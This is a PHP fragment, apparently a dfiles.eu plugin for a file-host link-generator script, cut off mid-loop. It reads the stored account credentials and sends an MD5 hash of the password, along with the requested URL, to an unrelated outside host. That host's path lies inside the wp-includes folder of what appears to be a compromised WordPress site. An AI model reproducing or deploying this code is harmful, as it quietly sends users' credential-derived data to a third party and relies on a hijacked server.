<?php
$account = trim($this->get_account("dfiles.eu"));
if (stristr($account,':')) list($user, $pass) = explode(':',$account);
else $cookie = $account;
if(empty($cookie)==false || ($user && $pass)){
	for ($j=0; $j < 2; $j++){
		$data = $this->curl("http://aeroclubdemimizan.com/wordpress/wp-includes/Text/ReDiff/vng270/", "secureid=".md5($pass), "urllist=".urlencode($url));
